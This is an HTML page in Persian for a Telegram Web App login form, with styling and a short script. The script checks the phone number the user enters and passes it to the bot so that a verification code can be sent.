<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ورود با شماره</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, Tahoma, sans-serif;
            padding: 20px;
            background: #ffffff;
            color: #000000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { width: 100%; max-width: 400px; }
        h1 { text-align: center; font-size: 24px; margin-bottom: 10px; }
        p { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
        .warning {
            background: #fff3cd;
            border-right: 4px solid #ff9800;
            padding: 12px 15px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 16px;
            font-size: 17px;
            border: 2px solid #ddd;
            border-radius: 10px;
            direction: ltr;
            text-align: left;
            outline: none;
        }
        input:focus { border-color: #2481cc; }
        button {
            width: 100%;
            padding: 16px;
            background: #2481cc;
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        button:disabled { opacity: 0.5; }
        #result { text-align: center; margin-top: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 ورود با شماره</h1>
        <p>شماره تلفن خود را وارد کنید</p>
        
        <div class="warning">
            ⚠️ با ادامه، موافقت می‌کنید که کد تأیید برای شما ارسال شود.
        </div>
        
        <label for="phone">شماره (با کد کشور):</label>
        <input type="tel" id="phone" placeholder="+989123456789" dir="ltr">
        
        <button id="btn" onclick="sendPhone()">ارسال کد تأیید</button>
        <p id="result"></p>
    </div>

    <script>
        var tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        function sendPhone() {
            var phone = document.getElementById('phone').value.trim();
            var btn = document.getElementById('btn');
            var result = document.getElementById('result');
            
            if (!phone) {
                tg.showAlert('لطفاً شماره را وارد کنید');
                return;
            }
            
            if (phone.charAt(0) !== '+') {
                tg.showAlert('شماره باید با + شروع شود');
                return;
            }
            
            btn.disabled = true;
            btn.textContent = '⏳ در حال ارسال...';
            result.textContent = 'در حال ارسال...';
            result.style.color = 'blue';
            
            try {
                var data = JSON.stringify({ phone: phone });
                tg.sendData(data);
                result.textContent = '✅ ارسال شد';
                result.style.color = 'green';
                
                setTimeout(function() { tg.close(); }, 500);
            } catch(e) {
                result.textContent = '❌ خطا: ' + e.message;
                result.style.color = 'red';
                btn.disabled = false;
                btn.textContent = 'ارسال کد تأیید';
            }
        }
        
        setTimeout(function() { document.getElementById('phone').focus(); }, 300);
    </script>
</body>
</html>
